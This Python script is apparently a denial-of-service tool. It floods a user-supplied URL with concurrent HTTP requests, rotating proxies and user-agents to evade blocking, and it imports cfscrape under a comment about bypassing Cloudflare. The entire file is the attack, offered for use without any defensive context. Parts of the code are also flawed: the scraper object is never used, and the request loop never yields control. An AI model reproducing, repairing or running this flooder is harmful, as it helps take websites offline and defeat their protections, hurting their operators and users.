import cfscrape
import aiohttp
import asyncio
import random
import time

# Read proxies and user-agents from files
def load_proxies():
    with open('proxies.txt', 'r') as file:
        return [line.strip() for line in file.readlines() if line.strip()]

def load_user_agents():
    with open('user-agent.txt', 'r') as file:
        return [line.strip() for line in file.readlines() if line.strip()]

# Load proxies and user-agents into memory
proxies = load_proxies()
user_agents = load_user_agents()

# Create a scraper instance to bypass Cloudflare
scraper = cfscrape.create_scraper()

# Global variables to track requests
total_requests_sent = 0
total_errors = 0

# Function to send asynchronous HTTP requests
async def send_request(session, url, proxy, user_agent):
    global total_requests_sent, total_errors

    try:
        headers = {'User-Agent': user_agent}
        async with session.get(url, proxy=proxy, headers=headers) as response:
            if response.status == 200:
                total_requests_sent += 1
            else:
                total_errors += 1
    except Exception as e:
        total_errors += 1

# Asynchronous function to create sessions and send requests
async def attack(target_url, duration):
    global total_requests_sent, total_errors
    end_time = time.time() + duration

    # Use aiohttp for asynchronous requests
    async with aiohttp.ClientSession() as session:
        while time.time() < end_time:
            # Select a random proxy and user-agent for each request
            proxy = random.choice(proxies)
            user_agent = random.choice(user_agents)

            # Use aiohttp proxy formatting
            formatted_proxy = f"http://{proxy}"
            asyncio.create_task(send_request(session, target_url, formatted_proxy, user_agent))

# Main function to start the attack
def start_attack(target_url, duration, requests_per_second):
    global total_requests_sent, total_errors
    print(f"Starting attack on {target_url} with high concurrency for {duration} seconds.")

    # Define the interval for requests and calculate the number of requests to send
    loop = asyncio.get_event_loop()
    tasks = []
    for _ in range(requests_per_second):
        tasks.append(attack(target_url, duration))

    # Run the attack tasks
    loop.run_until_complete(asyncio.gather(*tasks))

    # Display results
    print(f"Total requests sent: {total_requests_sent}")
    print(f"Total errors: {total_errors}")

# Input for the target and attack parameters
target_url = input("Enter the target URL (e.g., http://example.com): ")
duration = int(input("Enter attack duration in seconds (e.g., 60): "))
requests_per_second = int(input("Enter number of requests per second (e.g., 100000): "))

# Start the attack
start_attack(target_url, duration, requests_per_second)
          
